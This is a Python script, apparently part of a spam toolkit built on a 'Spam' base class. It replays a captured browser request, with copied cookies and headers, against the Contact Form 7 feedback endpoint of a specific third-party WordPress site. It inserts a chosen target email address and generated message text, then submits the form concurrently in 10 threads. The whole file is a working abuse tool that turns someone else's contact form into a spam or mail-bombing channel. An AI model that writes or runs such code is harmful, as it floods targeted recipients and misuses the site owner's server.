cookies = {
    '__wpdm_client': 'b90a60f3a0a54deed38266d0f292d7ef',
    '_ga': 'GA1.2.1642885429.1676558397',
    '_gid': 'GA1.2.1872742965.1676558397',
    '_gat_gtag_UA_186969693_1': '1',
}

headers = {
    'authority': 'rainbow1117.com',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryUhVAlVe0dxSvUFOE',
    # 'cookie': '__wpdm_client=b90a60f3a0a54deed38266d0f292d7ef; _ga=GA1.2.1642885429.1676558397; _gid=GA1.2.1872742965.1676558397; _gat_gtag_UA_186969693_1=1',
    'origin': 'https://rainbow1117.com',
    'referer': 'https://rainbow1117.com/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'mail_sent'
from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n17\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.4.2\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nja\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f17-p15-o1\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n15\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\nbeab871da737ca067e0f0524c7245cb7\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nwezx\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="tel"\r\n\r\n3123123\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n------WebKitFormBoundaryUhVAlVe0dxSvUFOE--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://rainbow1117.com/wp-json/contact-form-7/v1/contact-forms/17/feedback',
            cookies=cookies,
            headers=headers,
            data=data.encode(),
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
